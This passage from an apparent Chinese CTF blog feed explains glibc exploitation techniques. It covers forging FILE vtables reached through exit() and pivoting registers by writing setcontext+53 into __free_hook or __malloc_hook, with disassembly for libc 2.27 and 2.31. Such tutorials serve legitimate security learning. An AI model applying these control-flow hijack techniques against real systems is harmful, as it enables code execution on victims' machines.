class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment"> used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现攻击点:</p><ol><li><p>libc2.23以前三个标准流的vtable是可写的,可以修改函数指针</p></li><li><p>之后的版本因为位于libc段中的vtable是无法写入的,故可以选择伪造vtable中的setbuf或overflow(其中overflow需要达到一些条件)函数,来达到getshell</p></li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2018hctf-the-end"><a href="#2018hctf-the-end" class="headerlink" title="2018hctf-the_end"></a>2018hctf-the_end</h2><p>这道题有两种解法，但都是利用exit函数</p>]]></content>
    
    
    <summary type="html">exit函数初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="exit" scheme="https://ixout.github.io/tags/exit/"/>
    
    <category term="pwn技巧" scheme="https://ixout.github.io/tags/pwn%E6%8A%80%E5%B7%A7/"/>
    
  </entry>
  
  <entry>
    <title>pwn技巧-setcontext</title>
    <link href="https://ixout.github.io/posts/36187/"/>
    <id>https://ixout.github.io/posts/36187/</id>
    <published>2023-04-05T02:59:21.000Z</published>
    <updated>2023-04-08T12:29:14.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>setcontext是libc中的一个函数</p><p><strong>2.27版本</strong></p><p>利用一般从setcontext+53开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p><strong>2.31版本</strong></p><p>利用一般从setcontest+61开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000054F20                               public setcontext ; weak</span><br><span class="line">.text:0000000000054F20                               setcontext proc near                    ; CODE XREF: sub_5B470+80↓p</span><br><span class="line">.text:0000000000054F20                                                                       ; DATA XREF: LOAD:0000000000009368↑o</span><br><span class="line">.text:0000000000054F20                               ; __unwind &#123;</span><br><span class="line">.text:0000000000054F20 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000054F24 57                            push    rdi</span><br><span class="line">.text:0000000000054F25 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000054F2C 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:0000000000054F2E BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:0000000000054F33 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000054F39 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:0000000000054F3E 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000054F40 5A                            pop     rdx</span><br><span class="line">.text:0000000000054F41 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000054F47 0F 83 22 01 00 00             jnb     loc_5506F</span><br><span class="line">.text:0000000000054F47</span><br><span class="line">.text:0000000000054F4D 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000054F54 D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000054F56 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000054F5D 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000054F64 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000054F6B 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000054F6F 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000054F73 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000054F77 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000054F7B 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000054F7F 64 F7 04 25 48 00 00 00 02 00+test    dword ptr fs:48h, 2</span><br><span class="line">.text:0000000000054F7F 00 00</span><br><span class="line">.text:0000000000054F8B 0F 84 B5 00 00 00             jz      loc_55046</span><br><span class="line">.text:0000000000054F8B</span><br><span class="line">.text:0000000000054F91 48 8B B2 A8 03 00 00          mov     rsi, [rdx+3A8h]</span><br><span class="line">.text:0000000000054F98 48 89 F7                      mov     rdi, rsi</span><br><span class="line">.text:0000000000054F9B 48 8B 8A B0 03 00 00          mov     rcx, [rdx+3B0h]</span><br><span class="line">.text:0000000000054FA2 64 48 3B 0C 25 78 00 00 00    cmp     rcx, fs:78h</span><br><span class="line">.text:0000000000054FAB 74 38                         jz      short loc_54FE5</span><br><span class="line">.text:0000000000054FAB</span><br><span class="line">.text:0000000000054FAD</span><br><span class="line">.text:0000000000054FAD                               loc_54FAD:                              ; CODE XREF: setcontext+9E↓j</span><br><span class="line">.text:0000000000054FAD 48 8B 46 F8                   mov     rax, [rsi-8]</span><br><span class="line">.text:0000000000054FB1 48 83 E0 F8                   and     rax, 0FFFFFFFFFFFFFFF8h</span><br><span class="line">.text:0000000000054FB5 48 39 F0                      cmp     rax, rsi</span><br><span class="line">.text:0000000000054FB8 74 06                         jz      short loc_54FC0</span><br><span class="line">.text:0000000000054FB8</span><br><span class="line">.text:0000000000054FBA 48 83 EE 08                   sub     rsi, 8</span><br><span class="line">.text:0000000000054FBE EB ED                         jmp     short loc_54FAD</span><br><span class="line">.text:0000000000054FBE</span><br><span class="line">.text:0000000000054FC0                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000054FC0</span><br><span class="line">.text:0000000000054FC0                               loc_54FC0:                              ; CODE XREF: setcontext+98↑j</span><br><span class="line">.text:0000000000054FC0 48 C7 C0 01 00 00 00          mov     rax, 1</span><br><span class="line">.text:0000000000054FC7 F3 48 0F AE E8                incsspq rax</span><br><span class="line">.text:0000000000054FCC F3 0F 01 6E F8                rstorssp qword ptr [rsi-8]</span><br><span class="line">.text:0000000000054FD1 F3 0F 01 EA                   saveprevssp</span><br><span class="line">.text:0000000000054FD5 48 8B 82 B0 03 00 00          mov     rax, [rdx+3B0h]</span><br><span class="line">.text:0000000000054FDC 64 48 89 04 25 78 00 00 00    mov     fs:78h, rax</span><br><span class="line">.text:0000000000054FDC</span><br><span class="line">.text:0000000000054FE5</span><br><span class="line">.text:0000000000054FE5                               loc_54FE5:                              ; CODE XREF: setcontext+8B↑j</span><br><span class="line">.text:0000000000054FE5 F3 48 0F 1E C9                rdsspq  rcx</span><br><span class="line">.text:0000000000054FEA 48 29 F9                      sub     rcx, rdi</span><br><span class="line">.text:0000000000054FED 74 1D                         jz      short loc_5500C</span><br><span class="line">.text:0000000000054FED</span><br><span class="line">.text:0000000000054FEF 48 F7 D9                      neg     rcx</span><br><span class="line">.text:0000000000054FF2 48 C1 E9 03                   shr     rcx, 3</span><br><span class="line">.text:0000000000054FF6 BE FF 00 00 00                mov     esi, 0FFh</span><br><span class="line">.text:0000000000054FF6</span><br><span class="line">.text:0000000000054FFB</span><br><span class="line">.text:0000000000054FFB                               loc_54FFB:                              ; CODE XREF: setcontext+EA↓j</span><br><span class="line">.text:0000000000054FFB 48 39 F1                      cmp     rcx, rsi</span><br><span class="line">.text:0000000000054FFE 48 0F 42 F1                   cmovb   rsi, rcx</span><br><span class="line">.text:0000000000055002 F3 48 0F AE EE                incsspq rsi</span><br><span class="line">.text:0000000000055007 48 29 F1                      sub     rcx, rsi</span><br><span class="line">.text:000000000005500A 77 EF                         ja      short loc_54FFB</span><br><span class="line">.text:000000000005500A</span><br><span class="line">.text:000000000005500C</span><br><span class="line">.text:000000000005500C                               loc_5500C:                              ; CODE XREF: setcontext+CD↑j</span><br><span class="line">.text:000000000005500C 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055010 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055014 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:000000000005501B 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:000000000005501F 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055023 4C 8B 92 A8 00 00 00          mov     r10, [rdx+0A8h]</span><br><span class="line">.text:000000000005502A 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055031 F3 48 0F 1E C8                rdsspq  rax</span><br><span class="line">.text:0000000000055036 4C 3B 10                      cmp     r10, [rax]</span><br><span class="line">.text:0000000000055039 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000005503E 75 03                         jnz     short loc_55043</span><br><span class="line">.text:000000000005503E</span><br><span class="line">.text:0000000000055040 41 52                         push    r10</span><br><span class="line">.text:0000000000055042 C3                            retn</span><br><span class="line">.text:0000000000055042</span><br><span class="line">.text:0000000000055043                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000055043</span><br><span class="line">.text:0000000000055043                               loc_55043:                              ; CODE XREF: setcontext+11E↑j</span><br><span class="line">.text:0000000000055043 41 FF E2                      jmp     r10</span><br><span class="line">.text:0000000000055043</span><br><span class="line">.text:0000000000055046                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000055046</span><br><span class="line">.text:0000000000055046                               loc_55046:                              ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000055046 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:000000000005504D 51                            push    rcx</span><br><span class="line">.text:000000000005504E 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055052 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055056 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:000000000005505D 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000055061 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055065 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055065                               ; &#125; // starts at 54F20</span><br><span class="line">.text:000000000005506C                               ; __unwind &#123;</span><br><span class="line">.text:000000000005506C 31 C0                         xor     eax, eax</span><br><span class="line">.text:000000000005506E C3                            retn</span><br></pre></td></tr></table></figure><p>可以看出2.31的setcontext长了不少,但很多都被跳过了,实际执行的并没有多少变化</p><hr><p>不难看出利用的核心是rdi(2.27)和rdx(2.31)</p><p>需要从特定位置开始是因为上面的代码会使程序crash</p><p>程序控制了除rax以外的几乎所有寄存器,</p><p>其中rip是通过以下代码控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, [rdi/rdx+0A8h]</span><br><span class="line">push    rcx</span><br><span class="line">....</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>唯一不可控的rax也在 <code>xor     eax, eax</code>的作用下变为<strong>零</strong></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h2><p>2.29以下的利用要更为简单一些</p><p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题。我们通常是吧 setcontext + 53 写进 <strong>free_hook 或者 </strong>malloc_hook 中，然后建立或者释放一个堆块，此时的 rdi 就会是该堆块的 chunk 头，那如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序的执行流。</p><h2 id="2-29及以上"><a href="#2-29及以上" class="headerlink" title="2.29及以上"></a>2.29及以上</h2><p>2.29 最大的变动就是 setcontext 里控制寄存器由 rdi 变成了 rdx，这就使得我们无法通过直接控制 free 的堆块来控制寄存器。所以要用到一些 gadget 来把 rdi 和 rdx 转换一下。</p>]]></content>
    
    
    <summary type="html">setcontext初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn技巧" scheme="https://ixout.github.io/tags/pwn%E6%8A%80%E5%B7%A7/"/>
    
    <category term="setcontext" scheme="https://ixout.github.io/tags/setcontext/"/>
    
  </entry>
  
</feed>
